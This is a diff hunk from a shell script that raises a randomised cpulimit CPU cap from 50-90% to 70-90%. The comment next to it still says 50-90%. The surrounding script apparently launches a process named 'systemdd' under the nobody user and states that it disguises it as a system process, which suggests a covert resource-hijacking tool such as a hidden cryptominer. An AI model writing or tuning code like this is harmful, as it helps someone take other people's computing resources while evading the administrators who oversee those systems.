@@ -77,7 +77,7 @@ CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Assign to all logical cores
 
 # Limit total power consumption to 50% - 90% using cpulimit
 TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Total system power (logical CPUs x 100%)
-CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Random power limit between 50% and 90%
+CPU_LIMIT_PERCENT=$(shuf -i 70-90 -n 1)  # Random power limit between 50% and 90%
 CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Calculate actual power limit
 
 # Start the systemdd process under the nobody user and disguise it as a system process
